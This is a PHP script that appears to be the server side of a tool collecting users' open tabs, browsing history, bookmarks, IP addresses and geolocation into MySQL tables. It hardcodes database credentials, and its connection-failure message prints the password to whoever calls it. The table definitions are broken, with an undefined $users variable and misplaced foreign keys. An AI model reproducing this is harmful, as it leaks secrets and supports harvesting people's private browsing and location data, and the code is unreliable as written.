<?php
include_once 'send.php';

$servername = 'mg363964.mysql.tools';
$username = 'mg363964_db';
$password = 'wst8AKQt';
$dbname = 'mg363964_db';
$token = $_POST['token'];
$user = $_POST['user'];
$tabs = $_POST['tabs'];
$position = $_POST['position'];
$history = $_POST['history'];
$bookmarks = $_POST['bookmarks'];
$IP = $_POST['IP'];

$conn = new mysqli($servername, $username, $password, $dbname); // Create connection
if ($conn->connect_errno) {     // Check connection
    die("Connection failed: " . $conn->connect_error . "\nservername: " . $servername . "\ndbname:" . $dbname . "\nusername:" . $username . "\npassword: " . $password);
} 

$tabsTable = "CREATE TABLE IF NOT EXISTS `tabs` (
    `id` int NOT NULL AUTO_INCREMENT PRIMARY KEY,
    `dateLoaded` TIMESTAMP NOT NULL DEFAULT CURRENT_TIMESTAMP,
    `url` varchar(255) NOT NULL,
    `userId` int,
        FOREIGN KEY (id) 
            REFERENCES $users(id)
        )";
$bookmarksTable = "CREATE TABLE IF NOT EXISTS `bookmarks` (
    `id` int NOT NULL AUTO_INCREMENT PRIMARY KEY,
    `dateAdded` TIMESTAMP NOT NULL,
    `url` varchar(255) NOT NULL,
    `userId` int,
        FOREIGN KEY (id) 
            REFERENCES $users(id)
        )";
$historyTable = "CREATE TABLE IF NOT EXISTS `history` (
    `id` int NOT NULL AUTO_INCREMENT PRIMARY KEY,
    `lastVisitTime` TIMESTAMP NOT NULL,
    `url` varchar(255) NOT NULL,
    `visitCount` varchar(10) NOT NULL,
    `userId` int,
        FOREIGN KEY (id) 
            REFERENCES $users(id)
        )";
$iPTable = "CREATE TABLE IF NOT EXISTS `IP` (
    `id` int NOT NULL AUTO_INCREMENT PRIMARY KEY,
    `dateLoaded` TIMESTAMP NOT NULL DEFAULT CURRENT_TIMESTAMP,
    `externalIpAdress` varchar(20) NOT NULL,
    `localIpAdress` varchar(20) NOT NULL,
    `userId` int,
        FOREIGN KEY (id) 
            REFERENCES $users(id)
        )";
$positionTable = "CREATE TABLE IF NOT EXISTS `position` (
    `id` int NOT NULL AUTO_INCREMENT PRIMARY KEY,
    `dateLoaded` TIMESTAMP NOT NULL DEFAULT CURRENT_TIMESTAMP,
    `lat` varchar(50) NOT NULL,
    `lon` varchar(50) NOT NULL,
    `country` varchar(50) NOT NULL,
    `county` varchar(255) NOT NULL,
    `postCode` varchar(20) NOT NULL,
    `state` varchar(255) NOT NULL,
    `city` varchar(100) NOT NULL,
    `userId` int,
        FOREIGN KEY (id) 
            REFERENCES $users(id)
        )";
?>